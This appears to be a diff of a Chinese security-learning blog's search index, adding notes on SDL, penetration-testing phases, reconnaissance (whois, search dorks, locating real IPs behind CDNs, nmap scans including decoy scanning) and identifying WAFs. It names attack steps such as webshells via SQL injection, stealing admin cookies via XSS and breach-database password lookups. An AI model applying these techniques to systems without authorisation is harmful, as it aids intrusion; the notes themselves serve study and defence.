+<p>SDL是全面软件生命周期管理与最佳实践手段和工具相结合的产物，使用SDL方式可有效提升系统的安全等级，并将安全工作提升到可进行标准化实施的程度。微软的SDL理论基于三个核心概念开展：培训、持续的安全问题改进和问责制。SDL的目标是减少应用软件的漏洞数量级和严重程度，其完整生命周期主要阶段</p>
 <p>SDL的第一步就是安全培训。</p>
 <h2 id="安全培训内容"><a href="#安全培训内容" class="headerlink" title="安全培训内容"></a>安全培训内容</h2><p>Part 1：安全设计：包括减小攻击面、深度防御、最小权限原则、服务器安全配置等<br>Part 2：威胁建模：概述、设计意义、基于威胁建模的编码约束<br>Part 3：安全编码：缓冲区溢出（针对C&#x2F;C++）、整数算法错误（针对C&#x2F;C++）、XSS&#x2F;CSRF（对于Web类应用）、SQL注入（对于Web类应用）、弱加密<br>Part 4：安全测试：安全测试和黑盒测试的区别、风险评估、安全测试方法（代码审计、fuzz等）<br>Part 5：隐私与敏感数据：敏感数据类型、风险评估、隐私开发和测试的最佳实践<br>Part 6：高级概念：高级安全概念、可信用户界面设计、安全漏洞细节、自定义威胁缓解</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619214555452.png" alt="完整周期主要阶段"></p>
 <h1 id="5-场景与处理流程"><a href="#5-场景与处理流程" class="headerlink" title="5.场景与处理流程"></a>5.场景与处理流程</h1><h2 id="1-场景"><a href="#1-场景" class="headerlink" title="1.场景"></a>1.场景</h2><p>勒索病毒、挖矿木马、Webshell、网页篡改、DDos攻击、数据泄露、流量劫持。</p>
 <h2 id="2-处理流程"><a href="#2-处理流程" class="headerlink" title="2.处理流程"></a>2.处理流程</h2><p>事件类型</p>
 <p>时间范围</p>
@@ -3379,6 +3784,435 @@ echo $get
       </tags>
   </entry>
   <entry>
+    <title>渗透测试</title>
+    <url>/2023/05/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<h2 id="一、基本流程"><a href="#一、基本流程" class="headerlink" title="一、基本流程"></a>一、基本流程</h2><p>目标确认-&gt;信息收集-&gt;漏洞发现-&gt;漏洞利用-&gt;权限维持、内网渗透-&gt;目标获取、痕迹清理</p>
+<h3 id="1、目标确认"><a href="#1、目标确认" class="headerlink" title="1、目标确认"></a>1、目标确认</h3><p>要获取到什么权限</p>
+<h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><p>基础设施枚举（获取公司在互联网和内部网上的位置；确定公司的安全措施）</p>
+<p>服务枚举（服务版本、服务信息；许多服务有版本历史记录，可以识别主机或服务器上安装的版本是否是真的或新的）</p>
+<p>主机枚举（确定该主机或服务器扮演什么角色以及它与哪些网络组件通信。此外，确定所用服务及用途，以及端口。）</p>
+<p>掠夺（获取敏感信息如员工姓名、客户数据【需要在目标主机上获取到访问权限】）</p>
+<p>域名、IP、端口、服务端框架、语言、开源情报、防御措施等</p>
+<h4 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h4><p>正向记录(mx,ns,txt,spf,cname)</p>
+<p>反向查询(whois信息反查:电话、邮箱、姓名)</p>
+<p>备案信息</p>
+<h3 id="3-漏洞发现"><a href="#3-漏洞发现" class="headerlink" title="3.漏洞发现"></a>3.漏洞发现</h3><p>传统漏洞</p>
+<p>框架组件公开漏洞</p>
+<p>口令漏洞</p>
+<p>代码审计0day</p>
+<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>拖库、提权（写文件webshell、MYSQL UDF、sqlserver xp_cmdshell）</p>
+<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p>打管理员cookie、beef框架攻击管理员客户端</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230603172605460.png"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>用户视角下的信息探测</title>
+    <url>/2023/06/11/%E7%94%A8%E6%88%B7%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/</url>
+    <content><![CDATA[<h1 id="1-whois信息"><a href="#1-whois信息" class="headerlink" title="1.whois信息"></a>1.whois信息</h1><p>首先，获得了域名。比如<a href="http://www.baidu.com./">www.baidu.com。</a></p>
+<blockquote>
+<p>域名由DNS服务器负责解析，并告知用户浏览器目标站点的IP地址。域名均由域名提供商对公众开放，可由个人或企业出资购买，获得域名的使用权。</p>
+</blockquote>
+<p>whois是用来查询域名的IP以及所有者等信息的传输协议。</p>
+<p>通过whois可以查出目标域名是否被注册以及注册域名所有人的详细信息。</p>
+<blockquote>
+<p>whois信息中包含了注册商、注册人、注册人邮箱、域名注册日期、域名到期日期等信息。可以看到，其中的大量信息均为真实信息，并且这些信息对外公开。但某些情况下，域名所有人并不希望自己的注册信息被他人获取，如从事部分灰色产业的人员或者个人特定应用等。这种情况下，域名所有人可开启隐私保护功能，实现对个人信息的保护。</p>
+</blockquote>
+<p>当然了，隐私保护是一项增殖业务，如果账户欠费或转让，当前域名状态就失去了保护，所以查询当前域名的历史whois信息，可能获取其中的有效内容。</p>
+<p>whois信息的作用非常大，比如可利用其对应的注册信息进行反向查询，发现当前域名所有者其他的域名情况，在针对某些站点进行特征追踪时效果良好。</p>
+<p>如利用注册人邮箱实现whois信息反查。</p>
+<p>也许可以看到，相同的邮箱注册了多个域名。再尝试访问这些域名。</p>
+<blockquote>
+<p>综上所述，针对要防护的目标站点，域名的whois信息作为攻击者最先获得的内容，可从中找到域名所有人的基础信息，如姓名、常用邮箱、电话等。以常用邮箱为例，攻击者有可能将邮箱信息放入<strong>社工库</strong>进行查询，以获得更广泛的信息，甚至可能发现此邮箱对应的活动内容以及当前邮箱在其他地点（很多站点支持邮箱作为用户名来注册）所用的密码等内容，这将对后续的攻击过程提供非常大的便利。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618153333278.png" alt="whois信息攻击方式"></p>
+<h1 id="2-利用搜索引擎发现敏感信息"><a href="#2-利用搜索引擎发现敏感信息" class="headerlink" title="2.利用搜索引擎发现敏感信息"></a>2.利用搜索引擎发现敏感信息</h1><p>这个过程中极少与站点产生交互行为，也就有了很好的隐蔽措施。</p>
+<p>通过搜索引擎的基本语法及搜索思路展开测试。</p>
+<h2 id="1-常用操作符"><a href="#1-常用操作符" class="headerlink" title="1.常用操作符"></a>1.常用操作符</h2><p>搜索引擎会支持多种类型的操作符，以方便用户对目标信息进行更精确的查找。这也就为攻击者提供了信息查询的方便。目前主流的搜索引擎的查询语法中，常用的操作符有以下几种：</p>
+<table>
+<thead>
+<tr>
+<th>操作符</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>+</td>
+<td>联合查询</td>
+</tr>
+<tr>
+<td>-</td>
+<td>忽略某个字</td>
+</tr>
+<tr>
+<td>*</td>
+<td>通配符，可代表多个字母</td>
+</tr>
+<tr>
+<td>.</td>
+<td>单一通配符</td>
+</tr>
+<tr>
+<td>“ ”</td>
+<td>精准查询</td>
+</tr>
+<tr>
+<td>~</td>
+<td>同义词</td>
+</tr>
+</tbody></table>
+<h2 id="2-inurl"><a href="#2-inurl" class="headerlink" title="2.inurl"></a>2.inurl</h2><p>用于搜索在目标URL中出现关键字的信息。</p>
+<blockquote>
+<p>想查询格式为php的管理页面，其关键字为“admin”“php”。这时，可利用空格方式进行连接，如“inurl php id”，从而实现匹配url中的所有关键字。</p>
+</blockquote>
+<p><code>inurl admin</code>这种一般就是找后台</p>
+<p>所以要么通过隐藏后台，要么添加允许连接IP的白名单等手段来提升安全性。</p>
+<h2 id="3-title"><a href="#3-title" class="headerlink" title="3.title"></a>3.title</h2><p>关键字“tittle管理后台”、“tittle人员信息”</p>
+<h2 id="4-filetype"><a href="#4-filetype" class="headerlink" title="4.filetype"></a>4.filetype</h2><p>用于指定查询文件的后缀名，如bak、sql、ini、xls、htaccess等。</p>
+<blockquote>
+<p>一般来说，这类信息涉及站点的备份信息、数据库信息、表格等内容。假设管理员没有及时删除，并且此信息恰好被搜索引擎收录，则会展示相应的结果。这类敏感信息会使攻击者更全面地了解目标站点的特征及有效内容。</p>
+</blockquote>
+<h2 id="5-site"><a href="#5-site" class="headerlink" title="5.site"></a>5.site</h2><p>site用于在指定网站内搜索有效信息，可直接使用“site：域名+关键字”来查找当前目标站点中指定的内容信息。</p>
+<blockquote>
+<p>如site:<a href="http://www.baidu.com/">www.baidu.com</a> asddasads</p>
+</blockquote>
+<h2 id="6-cache"><a href="#6-cache" class="headerlink" title="6.cache"></a>6.cache</h2><p>利用搜索引擎之前缓存的信息进行查询。利用搜索引擎之前缓存的信息进行查询。</p>
+<h2 id="7-daterange"><a href="#7-daterange" class="headerlink" title="7.daterange"></a>7.daterange</h2><p>使用daterange关键词指定搜索的日期。但此方法使用起来比较麻烦，并且目前主流的搜索引擎均都自带时间控制，可在搜索引擎的筛选栏中选择所需要的部分。</p>
+<h2 id="综合利用搜索引擎"><a href="#综合利用搜索引擎" class="headerlink" title="综合利用搜索引擎"></a>综合利用搜索引擎</h2><h3 id="1-使用缓存匿名浏览"><a href="#1-使用缓存匿名浏览" class="headerlink" title="1.使用缓存匿名浏览"></a>1.使用缓存匿名浏览</h3><p>利用缓存可以看到更新之前的页面，也可以匿名获取到网站服务器的数据拷贝（在此必须要选择只查看文本，不然仍会向服务器发送访问请求）。</p>
+<p><code>cache:xxx.com/xxx.html</code></p>
+<p>这样做的优点是：目标网站并没有真实的访问记录，只是在搜索引擎缓存的数据中进行查询。在某些特定场景，如APT攻击中，可能会有较大的用途。</p>
+<h3 id="2-获取特殊信息"><a href="#2-获取特殊信息" class="headerlink" title="2.获取特殊信息"></a>2.获取特殊信息</h3><p>网站上线后并没有将原有的备份文件或SQL文件删除，还存在于网站的目录中。这样会导致网站的某些重要的信息隐藏在某个页面的角落里，使用搜索引擎可以高效地查找这些信息，使用filetype：sql或者ini、bak、log等还可以查找网站的隐私文件。</p>
+<p><code>site:XXX.cn fi letype:sql</code></p>
+<p>.bak这类属于备份文件</p>
+<blockquote>
+<p>site: xxx.com filetype:xls</p>
+<p>“site powered by limbo cms” site:”xxx.com”</p>
+</blockquote>
+<p>搜索引擎可帮助更多用户了解及访问网站，但是其中的信息也会被搜索引擎收录。</p>
+<p>作为系统管理员的话，也可以定期搜索网站特定内容，对重要信息进行处理，避免被攻击者发现。</p>
+<h3 id="3-后台管理页面、目录列表或特殊页面"><a href="#3-后台管理页面、目录列表或特殊页面" class="headerlink" title="3.后台管理页面、目录列表或特殊页面"></a>3.后台管理页面、目录列表或特殊页面</h3><h4 id="后台管理页面"><a href="#后台管理页面" class="headerlink" title="后台管理页面"></a>后台管理页面</h4><p>如果攻击者发现<strong>后台登录页面</strong>，第一反应就是采取<strong>爆破</strong>等手段进行攻击，或者在<strong>前台利用SQL注入、XSS存储跨站</strong>等手段获取管理员账号信息后进行登录。因此，后台管理页面应尽量不被攻击者发现。</p>
+<h4 id="目录列表"><a href="#目录列表" class="headerlink" title="目录列表"></a><strong>目录列表</strong></h4><p>正常情况下，访问一个网站会发起一个HTTP请求，Web服务器会根据请求中的URL路径来响应对应的页面。因此，用户每一次访问的页面应该只是服务器Web目录的某个页面或文件（如PDF等格式）。但是，如果Web服务器存在目录列举的问题，可<strong>导致用户端直接观察到当前目录的所有文件及结构</strong>，这样会极大暴露目标站点的信息。</p>
+<p><code>intitle:index of &quot;server at&quot;</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618184526853.png"></p>
+<p>列目录在文件服务器中非常常见，可方便用户快速寻找所需要的文件并下载。但针对普通站点来说，如果可看到站点的相关的目录，攻击者就可快速了解站点结构，并且可对其中的重要文件或页面进行下载，</p>
+<h4 id="专项搜索用法汇总"><a href="#专项搜索用法汇总" class="headerlink" title="专项搜索用法汇总"></a>专项搜索用法汇总</h4><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618184743922.png"></p>
+<p>Zoome eye搜索</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618185621268.png"></p>
+<h1 id="3-真实IP地址发现手段"><a href="#3-真实IP地址发现手段" class="headerlink" title="3.真实IP地址发现手段"></a>3.真实IP地址发现手段</h1><p>出现域名与真实IP不对应的情况。这主要是Web站点为了提高用户的访问速度，使用了CDN（内容分发网络）技术。</p>
+<blockquote>
+<p>CDN的特点是可以将内容在本地展示，并配合CDN的网络在全国各地做内容缓存分发。这样，用户直接访问的域名对应的IP地址为CDN地址，而非目标Web站点的真实地址。当初步获取到目标IP地址后，可利用目前互联网上的CDN地址段查询接口确认当前访问的地址是否为CDN。</p>
+</blockquote>
+<p>获取目标Web系统的真实IP地址经常利用的方式如下。</p>
+<h2 id="1-查找分站的IP"><a href="#1-查找分站的IP" class="headerlink" title="1.查找分站的IP"></a>1.查找分站的IP</h2><p>由于CDN为收费服务，部分网站的某些分站由于访问量较小，因此选择仅在主站上配置CDN服务器，而分站并不配置。因此，可以遍历目标站点的分站地址，并找到分站地址对应的IP，再通过扫描C段的80端口，从而找到主站的IP地址。</p>
+<blockquote>
+<p>C段是指IPv4地址中的第三个部分，通常用于标识特定的网络。例如，在地址192.168.0.0&#x2F;24中，C段是0，表示这个地址是一个属于C段的地址。子网掩码是24</p>
+<p>之所以是C段扫描，是因为范围更小，就2^8&#x3D;256-2&#x3D;254个主机地址，更具有针对性，资源消耗也少</p>
+</blockquote>
+<p>如果此网站有邮件服务器且没有使用公共SMTP服务器，也可以尝试DNS的MX记录，很多时候也会有相应收获。</p>
+<h2 id="2-尝试服务器主动发起联系"><a href="#2-尝试服务器主动发起联系" class="headerlink" title="2.尝试服务器主动发起联系"></a>2.尝试服务器主动发起联系</h2><p>让服务器主动联系，就可以轻松知道服务器的IP地址。比如，服务器发送注册或者验证码邮件，在邮件头就可以知道IP地址。但目前有很多第三方验证码及验证邮件发送平台，因此需对这种方式下得到的地址进行后续人工判断，确认地址归属。</p>
+<h2 id="3-ping-xxx"><a href="#3-ping-xxx" class="headerlink" title="3.ping xxx"></a>3.ping xxx</h2><p>很多人喜欢使用xxx.com（裸域）访问网站，所以部分网站为了给用户良好的体验并且不让搜索引擎认为域名已被劫持，通常都是给xxx.com（裸域）使用301重定向至<a href="http://www.xxx.com.xxx.com与www.xxx.com是不同的两条解析记录,很可能存在xxx.com没有使用cdn的情况./">www.xxx.com。xxx.com与www.xxx.com是不同的两条解析记录，很可能存在xxx.com没有使用CDN的情况。</a></p>
+<blockquote>
+<p>C:\Users\67538&gt;ping <a href="http://www.baidu.com/">www.baidu.com</a></p>
+<p>正在 Ping <a href="http://www.a.shifen.com/">www.a.shifen.com</a> [36.152.44.96] 具有 32 字节的数据:<br>来自 36.152.44.96 的回复: 字节&#x3D;32 时间&#x3D;34ms TTL&#x3D;56<br>来自 36.152.44.96 的回复: 字节&#x3D;32 时间&#x3D;32ms TTL&#x3D;56</p>
+</blockquote>
+<blockquote>
+<p>C:\Users\67538&gt;ping baidu.com</p>
+<p>正在 Ping baidu.com [39.156.66.10] 具有 32 字节的数据:<br>来自 39.156.66.10 的回复: 字节&#x3D;32 时间&#x3D;51ms TTL&#x3D;53<br>来自 39.156.66.10 的回复: 字节&#x3D;32 时间&#x3D;51ms TTL&#x3D;53</p>
+</blockquote>
+<p>可看到直接ping <a href="http://www.baidu.com返回的是www.a.shifen.com,这是百度的一个别名,用以提升各地用户的访问速度./">www.baidu.com返回的是www.a.shifen.com，这是百度的一个别名，用以提升各地用户的访问速度。</a></p>
+<h2 id="4-phpinfo"><a href="#4-phpinfo" class="headerlink" title="4.phpinfo"></a>4.phpinfo</h2><p>phpinfo包含了当前服务器的真实信息</p>
+<h2 id="5-XSS"><a href="#5-XSS" class="headerlink" title="5.XSS"></a>5.XSS</h2><p>如果目标站点存在存储型XSS攻击漏洞，那么就可利用XSS漏洞实现针对真实IP地址的发现。在实际情况中，如果管理员打开特殊构造的页面，且管理员与服务器在同一个网段，再结合扫描即可找到真实IP。</p>
+<p>但JavaScript本身并没有获取本地IP地址的能力，一般需要第三方软件来完成。比如，客户端安装了Java环境（JRE），那么XSS就可以通过调用Java Applet的接口获取客户端的本地IP地址。在XSS攻击框架“Attack API”中，就有一个获取本地IP地址的API。</p>
+<p>这样做的好处在于可以由服务器主动响应攻击代码，并自动发送真实IP地址。但是使用环境较为苛刻，必须要求有存储型XSS漏洞，且漏洞会被管理员或者内部人员触发。</p>
+<p>当然了，既然存储型XSS漏洞存在的话，一般是直接利用存储型XSS漏洞<strong>获取管理员权限</strong>，<strong>并寻找后台地址进行登录尝试</strong>。</p>
+<blockquote>
+<p>知道管理员的账号和密码的前提下，获取到cookie，然后放到请求头中，发给服务器。</p>
+</blockquote>
+<h2 id="6-全网扫描"><a href="#6-全网扫描" class="headerlink" title="6.全网扫描"></a>6.全网扫描</h2><p>利用分布式扫描工具进行全网扫描，并进行特征分析及提取，进而确定目标的真实地址。</p>
+<p>1）找到开启了80端口的主机。</p>
+<p>2）找到host为<a href="http://www.xxx.com的ip./">www.xxx.com的IP。</a></p>
+<p>3）再扫一次抓取特征，通过去除错误页面、空页面等方法得到真实IP。</p>
+<p>在这个过程中，会进行大量的端口扫描，因此对带宽占用非常大，并且大量发包在现有网络中会被认为攻击行为。但这是一种有效寻找目标真实IP的方法。</p>
+<h2 id="7-CDN服务商"><a href="#7-CDN服务商" class="headerlink" title="7.CDN服务商"></a>7.CDN服务商</h2><p>如果知道目标站点的CND服务商，那么可想办法进入CDN服务商的管理后台得到真实IP，如利用管理员的弱密码等。通常的方式是利用管理员的公共信息，并在社工库中进行查询，以寻找是否有弱密码等。这种方式的成功率不高，但也确实存在此类场景。</p>
+<h2 id="方法总结"><a href="#方法总结" class="headerlink" title="方法总结"></a>方法总结</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618191939335.png" alt="获取真实ip方法总结"></p>
+<h1 id="4-真实物理地址"><a href="#4-真实物理地址" class="headerlink" title="4.真实物理地址"></a>4.真实物理地址</h1><p>国内大量的IP地址只能分配到一个物理社区或单位，并在网关处利用私网地址来通过当前的物理地址进行网络访问。</p>
+<p>正是基于这种状况，目前真实地理位置查询仅能追查到公网IP地址的分配点上，也就是共用同一个IP地址的社区或单位。</p>
+<blockquote>
+<p>下面提供了一些目前有效的查询网址：</p>
+<p>·<a href="http://ip.chacuo.net/">http://ip.chacuo.net</a></p>
+<p>·<a href="http://www.ipip.net/">http://www.ipip.net</a></p>
+<p>·<a href="http://ip.chinaz.com/">http://ip.chinaz.com</a></p>
+<p>·<a href="http://ip.qq.com/cgi-bin">http://ip.qq.com/cgi-bin</a></p>
+<p>·<a href="http://iptogeo.sinaapp.com/">http://iptogeo.sinaapp.com</a></p>
+<p>·<a href="http://ip.taobao.com/index.php">http://ip.taobao.com/index.php</a></p>
+<p>·<a href="http://ip.taobao.com/service/getIpInfo.php">http://ip.taobao.com/service/getIpInfo.php</a></p>
+<p>·<a href="http://int.dpool.sina.com.cn/iplookup/iplookup.php">http://int.dpool.sina.com.cn/iplookup/iplookup.php</a></p>
+</blockquote>
+<p>当然弄了，实际攻击过程中，发现真实物理地址并没有太多价值。如果要跑到服务器所在地，当地连WIFI或社工手段的话，也不是不行。</p>
+<h1 id="5-目标端口开放情况"><a href="#5-目标端口开放情况" class="headerlink" title="5.目标端口开放情况"></a>5.目标端口开放情况</h1><p>这里所说的端口是指TCP&#x2F;IP协议支持的0～65535端口，可采用TCP UDP方式来传输数据。</p>
+<p>在Web应用中，HTTP协议默认利用TCP80端口，HTTPS协议默认利用443端口进行数据传输。</p>
+<p>一般情况下，常利用NMAP进行端口扫描。目前也有像ZMAP等新兴工具，metaspoilt也可用于端口扫描，大量漏洞扫描工具均有此类功能。</p>
+<p>NMAP比较常用，以NMAP为例</p>
+<blockquote>
+<p>利用NMAP可扫描目标的端口开放情况、对应版本、操作系统等多种信息。NMAP可扫描目标站点的端口开放情况及对应业务，</p>
+</blockquote>
+<h2 id="1-获取远程主机的系统类型及开放端口"><a href="#1-获取远程主机的系统类型及开放端口" class="headerlink" title="1.获取远程主机的系统类型及开放端口"></a>1.获取远程主机的系统类型及开放端口</h2><p><code>Nmap -sS -P0 -sV -O &lt;target&gt;</code></p>
+<blockquote>
+<p>这里的&lt;target&gt;可以是单一IP或主机名、域名、子网。其中参数的意义为：</p>
+<p>·-sS：进行TCP SYN扫描（又称半连接扫描）。</p>
+<p>·-P0：允许用户关闭ICMP pings。</p>
+<p>·-sV：打开系统版本检测。</p>
+<p>·-O：尝试识别远程操作系统。</p>
+<p>除此之外，还可以添加其他选项，实现信息的多方面输出：</p>
+<p>·-A：同时打开操作系统指纹和版本检测。</p>
+<p>·-v：详细输出扫描情况。</p>
+</blockquote>
+<h2 id="2-列出开放了指定端口的主机列表"><a href="#2-列出开放了指定端口的主机列表" class="headerlink" title="2.列出开放了指定端口的主机列表"></a>2.列出开放了指定端口的主机列表</h2><p><code>nmap -sT -p 80 -oG – 192.168.1.* | grep open</code></p>
+<h2 id="3-在局域网络寻找所有在线主机"><a href="#3-在局域网络寻找所有在线主机" class="headerlink" title="3.在局域网络寻找所有在线主机"></a>3.在局域网络寻找所有在线主机</h2><p><code>nmap -sP 192.168.0.*</code></p>
+<p>也可使用以下命令：</p>
+<p><code>nmap -sP 192.168.0.0/24</code></p>
+<p>这里的*（星号）表示该位为1～254，&#x2F;24代表子网掩码。</p>
+<h2 id="4-Ping指定范围内的IP地址"><a href="#4-Ping指定范围内的IP地址" class="headerlink" title="4.Ping指定范围内的IP地址"></a>4.Ping指定范围内的IP地址</h2><p><code>nmap -sP 192.168.1.100-254</code></p>
+<h2 id="5-在某段子网上查找未占用的IP"><a href="#5-在某段子网上查找未占用的IP" class="headerlink" title="5.在某段子网上查找未占用的IP"></a>5.在某段子网上查找未占用的IP</h2><p><code>nmap -T4 -sP 192.168.2.0/24 &amp;&amp; egrep &quot;00:00:00:00:00:00&quot; /proc/net/arp</code></p>
+<h2 id="6-使用诱饵扫描方法来扫描主机端口"><a href="#6-使用诱饵扫描方法来扫描主机端口" class="headerlink" title="6.使用诱饵扫描方法来扫描主机端口"></a>6.使用诱饵扫描方法来扫描主机端口</h2><p><code>nmap –sS 192.168.0.10 –D 192.168.0.2</code></p>
+<h2 id="常用端口扫描汇总"><a href="#常用端口扫描汇总" class="headerlink" title="常用端口扫描汇总"></a>常用端口扫描汇总</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618192936959.png"></p>
+<h1 id="6-目标版本特征发现"><a href="#6-目标版本特征发现" class="headerlink" title="6.目标版本特征发现"></a>6.目标版本特征发现</h1><p>中间件版本等信息对攻击者来说非常重要，攻击者会利用获取的目标中间件信息来寻找合适的渗透手段。</p>
+<p>通常，攻击者在观察目标时，会利用非正常手段导致目标报错，诱使目标返回错误页面。中间件默认的错误页面中多包含中间版版本等信息。</p>
+<p>对用户而言，他们没有必要知道当前服务器的版本信息、报错等内容。因此不推荐输出这些内容。建议隐藏这类中间版本，报错直接给个404就完事了。</p>
+<p>多数情况下，运维人员会修改默认的错误页面，或者强制访问错误后直接跳转到首页或断开当前连接。这样就可以防止攻击者通过观察报错页面得到站点的基本信息。这种情况下，可利用扫描工具（如NMAP）进行尝试，也可发现目标的一些中间件特征。</p>
+<blockquote>
+<p>其原理就是获取目标服务器的响应包头，并针对其中的<strong>server字段</strong>信息进行判断。大多数中间件都会在server字段中填写当前服务器的版本内容。</p>
+</blockquote>
+<h1 id="7-web漏扫工具"><a href="#7-web漏扫工具" class="headerlink" title="7.web漏扫工具"></a>7.web漏扫工具</h1><p>使用Web漏洞扫描工具的好处在于其检查速度及范围远远高于人工检查，并且可同时针对多个站点进行扫描，对效率提升有极大帮助。</p>
+<p>其缺点在于，Web漏洞扫描器并不能完全发现所有漏洞，对很多隐藏很深的漏洞会出现误报及漏报的情况。因此，Web扫描器并非万能。攻击者通常<strong>先利用Web漏洞扫描器</strong>进行初步、全面的探测，之后再利用<strong>人工</strong>方式针对疑似点进行进一步渗透尝试。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618193311361.png"></p>
+<p>综上，Web漏洞扫描工具的用法非常简单，输入目标地址、配置相应参数后即可自动化开展扫描。针对Web扫描器的扫描行为，可通过识别http头的server信息进行阻断，或者对各类漏洞测试语句进行过滤。而避免漏洞出现是最根本的方式。</p>
+<h1 id="8-分站信息查找"><a href="#8-分站信息查找" class="headerlink" title="8.分站信息查找"></a>8.分站信息查找</h1><p>分站有助于清晰地划分业务逻辑及功能。很多情况下，由于主站访问量很大并且非常重要，运维人员会投入大量精力去管理主站，这在一定程度上会忽视<strong>分站安全</strong>。</p>
+<p>在各大互联网公司的SRC（应急响应中心）或漏洞提交平台，可看到其中的绝大部分漏洞均为分站下的漏洞情况。</p>
+<p>攻击者在面对对主站渗透攻击过程受阻时，会考虑针对分站的漏洞开展攻击，实现迂回攻击的效果。因此，分站极易成为网站整体安全的短板。</p>
+<p>下面是分站寻找方式的总结</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618195351578.png"></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>大量分站由于没有收录而无法被搜索引擎获取。如果需要获取详细信息，可利用各类子域名爆破类等工具进行自动化爆破尝试</p>
+]]></content>
+      <categories>
+        <category>《WEB安全基础》</category>
+        <category>信息探测</category>
+      </categories>
+      <tags>
+        <tag>《WEB安全基础》</tag>
+        <tag>信息探测</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web防护及识别</title>
+    <url>/2023/06/11/%E7%94%A8%E6%88%B7%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E9%98%B2%E6%8A%A4%E6%89%8B%E6%AE%B5%E8%AF%86%E5%88%AB/</url>
+    <content><![CDATA[<p>标准的防护方案为从硬件层面利用防火墙封锁高危IP、利用WAF设备在线阻断攻击，或者在Web服务器上开启防火墙、部署相关防护策略等。</p>
+<p>大部分防护手段对攻击的防护效果良好，如各类硬件WAF、各类云WAF、服务器防护软件等。</p>
+<p>在用户视角下进行防护手段的识别，可更有效地发现当前系统的隐藏威胁。</p>
+<h1 id="1-开放端口及对应业务识别"><a href="#1-开放端口及对应业务识别" class="headerlink" title="1.开放端口及对应业务识别"></a>1.开放端口及对应业务识别</h1><p>kali利用nmap对特定ip扫描端口，可以找到一些<strong>open状态的</strong>端口。</p>
+<p>遇到一些是<strong>filtered状态</strong>的端口呢，说明是开放的，但成为阻断状态，说明目标主机不仅限于有防火墙，各类防护软件、配置规则等都能形成filtered的效果。</p>
+<blockquote>
+<p>扫描开放端口的目的在于寻找可与目标服务器交互的点，并且了解目标的具体功能。在进行内网渗透时，这些被防火墙过滤的端口在内网中便可被使用。因此，扫描端口的作用非常多，并可有效扩展攻击目标。</p>
+</blockquote>
+<h1 id="2-是否有防护类软件"><a href="#2-是否有防护类软件" class="headerlink" title="2.是否有防护类软件"></a>2.是否有防护类软件</h1><p>1）直接<strong>利用错误参数打开目标站点的报错页面</strong>。例如，安全狗、360云防护等会在报错页面留有明确信息或特征。这些特征基本上无法修改，并且部分防护软件还会在报错页面中添加广告信息等，这都算是防护软件的一种标识。</p>
+<p>2）<strong>利用NMAP扫描目标站点，查看是否有已开放但被过滤的端口</strong>。如存在这样的端口，基本上可判定服务器前面会有防火墙。如果端口被防火墙过滤，那么此端口在外部无法直接利用。但事无绝对，假设内网数据库服务器开放3306端口并在防火墙处被过滤，则攻击者如果对此网络中任意一台设备成功渗透，就可以在内网利用3306端口开展连接等。</p>
+<p>3）<strong>利用Burpsuite抓取与目标系统通信的响应包，观察HTTP包头的server参数，看是否有WAF相关标识。</strong></p>
+<p>4）<strong>利用目录爆破工具，并从低速逐步升到高速，查看哪些阶段被封锁</strong>。一个没有添加防护设备或防护策略的站点并不会阻拦来自互联网的访问行为。设置安全设备或安全策略时都会考虑针对DDoS攻击的防护，会对来自同一地址的访问频率进行限制。因此<strong>逐步提升访问效率，即可测试出目标站点的阈值</strong>。可利用工具进行测试，</p>
+<h2 id="防护总结"><a href="#防护总结" class="headerlink" title="防护总结"></a>防护总结</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618200336378.png"></p>
+<blockquote>
+<p>搜索结果的 “banner” 是指在网络设备（如服务器、路由器、摄像头等）的响应中返回的特定信息。这些信息通常包含了设备的详细描述、设备型号、软件版本、协议信息等。通过分析设备返回的 banner 信息</p>
+</blockquote>
+<h1 id="3-常用防护方案"><a href="#3-常用防护方案" class="headerlink" title="3.常用防护方案"></a>3.常用防护方案</h1><p>在设计整体防护方案时，大多数人的直观想法是尽可能消灭漏洞。</p>
+<p>但在实际安全防护工作中，由于Web开发人员对安全的理解不足、运维人员的安全技术能力稍弱等因素，均会造成无法在第一时间发现漏洞并将其消除。</p>
+<p>漏洞会随着攻防技术发展不断涌现，而且公司的渗透测试和代码审计服务价格不菲。因此，在设计方案时，必须考虑“适度防护”。</p>
+<p>适度防护的原则是：<strong>建立防护手段，使攻击者的攻击代价（时间成本等）大于攻击成功后的价值</strong>，这样可使攻击者主动放弃攻击目标，从而达到较好的防护效果。</p>
